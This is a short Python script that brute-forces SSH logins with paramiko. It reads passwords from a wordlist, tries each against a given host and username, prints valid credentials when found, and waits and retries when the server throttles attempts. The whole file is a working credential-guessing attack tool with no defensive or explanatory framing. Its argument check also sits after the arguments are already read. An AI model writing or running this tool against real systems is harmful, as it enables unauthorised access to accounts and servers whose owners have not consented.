import paramiko
import socket
import time
import sys
from colorama import Fore

IP = sys.argv[1]
hostname = IP
username = sys.argv[2]
wordlist = sys.argv[3]

#print(IP)

if(len(sys.argv) < 3):
    print("Usage : python echinda.py <IP> <username> <wordlist>")
    exit()

def knock(hostname,username,password):

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname,username=username,password=password,timeout=3)

    except socket.timeout:
        print(Fore.RED + '{} is unreachable'.format(hostname))

    except paramiko.AuthenticationException:
        print(Fore.GREEN + 'Invalid Credentials :: {} :: {}'.format(username,password))

    except paramiko.SSHException:
        print(Fore.BLUE + 'Quota exceeded ..Retrying ')
        time.sleep(50)
        return knock(hostname,username,password)

    else:
        print(Fore.RED + 'Valid Credentials :: {} :: {}'.format(username,password))
        


def begin():

    file = open(wordlist, 'r')
    for line in file:
        passw = line.strip()
        knock(hostname,username,passw)


#######
begin()

